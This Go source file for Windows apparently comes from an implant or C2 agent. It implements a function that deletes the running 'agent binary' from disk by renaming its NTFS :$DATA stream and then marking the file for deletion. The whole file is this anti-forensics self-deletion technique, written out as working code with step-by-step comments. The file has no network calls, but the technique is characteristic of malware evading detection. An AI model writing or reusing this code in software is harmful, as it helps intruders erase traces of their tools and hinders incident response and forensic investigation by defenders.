//go:build windows

package main

import (
	"encoding/binary"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32SD              = windows.NewLazySystemDLL("kernel32.dll")
	procSetFileInfoByHandle = kernel32SD.NewProc("SetFileInformationByHandle")
)

const (
	fileRenameInfo      = 3 // FileRenameInfo class
	fileDispositionInfo = 4 // FileDispositionInfo class
)

// selfDeleteBinary removes the agent binary from disk using the NTFS stream rename technique.
// Steps: rename the default :$DATA stream to an alternate stream, then mark the file for deletion.
// This works because once the data stream is renamed, Windows no longer considers the file locked.
func selfDeleteBinary() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	pathW, err := syscall.UTF16PtrFromString(exePath)
	if err != nil {
		return
	}

	// Step 1: Open file with DELETE access
	handle, err := windows.CreateFile(
		pathW,
		windows.DELETE|windows.SYNCHRONIZE,
		windows.FILE_SHARE_READ,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return
	}

	// Step 2: Rename the default :$DATA stream to ":x"
	// This makes the main file data empty so Windows won't block deletion
	streamName, _ := syscall.UTF16FromString(":x")
	streamNameBytes := len(streamName) * 2

	// FILE_RENAME_INFO layout on amd64:
	//   Offset 0:  Flags/ReplaceIfExists (DWORD, 4 bytes)
	//   Offset 4:  padding (4 bytes for HANDLE alignment)
	//   Offset 8:  RootDirectory (HANDLE, 8 bytes)
	//   Offset 16: FileNameLength (DWORD, 4 bytes)
	//   Offset 20: FileName (variable, WCHAR array)
	const headerSize = 20
	buf := make([]byte, headerSize+streamNameBytes)

	binary.LittleEndian.PutUint32(buf[0:], 0)                          // Flags = 0
	binary.LittleEndian.PutUint64(buf[8:], 0)                          // RootDirectory = NULL
	binary.LittleEndian.PutUint32(buf[16:], uint32(streamNameBytes-2)) // FileNameLength (exclude null)
	for i, c := range streamName {
		binary.LittleEndian.PutUint16(buf[headerSize+i*2:], c)
	}

	ret, _, _ := procSetFileInfoByHandle.Call(
		uintptr(handle),
		fileRenameInfo,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
	)
	windows.CloseHandle(handle)

	if ret == 0 {
		return // Rename failed
	}

	// Step 3: Reopen and mark for deletion
	handle2, err := windows.CreateFile(
		pathW,
		windows.DELETE|windows.SYNCHRONIZE,
		windows.FILE_SHARE_READ,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return
	}

	// FILE_DISPOSITION_INFO: BOOLEAN DeleteFile (1 byte, padded to 4)
	var disp [4]byte
	disp[0] = 1 // DeleteFile = TRUE

	procSetFileInfoByHandle.Call(
		uintptr(handle2),
		fileDispositionInfo,
		uintptr(unsafe.Pointer(&disp[0])),
		uintptr(len(disp)),
	)
	windows.CloseHandle(handle2)
}
